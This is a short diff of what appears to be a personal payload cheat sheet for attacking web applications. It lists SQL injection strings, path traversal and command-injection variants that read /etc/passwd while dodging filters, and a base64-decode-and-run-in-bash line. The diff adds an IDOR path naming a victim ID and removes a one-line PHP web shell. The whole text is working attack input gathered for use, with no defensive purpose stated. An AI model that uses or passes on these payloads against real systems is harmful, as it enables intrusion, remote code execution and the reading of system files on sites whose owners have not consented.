@@ -10,15 +10,15 @@ OR 1=1
 Admin'+OR+1=1%23
 
 RCE (Remote Code Execution):
+....//
 '..../etc/passwd
 ../../../../etc/passwd
+/???/ca? /e*/p*wd
 c''at /etc//passwd
 {cat,/etc//passwd}
 cat${IFS,}/etc//passwd
 $(rev<<<'dwssap/cte/ tac')
 echo ... | base64 -d | bash
-/???/ca? /e*/p*wd
-....//
+/{victim-id}/activity/attachments/
 
-php:
-<?php system($_GET['cmd']); ?>
+
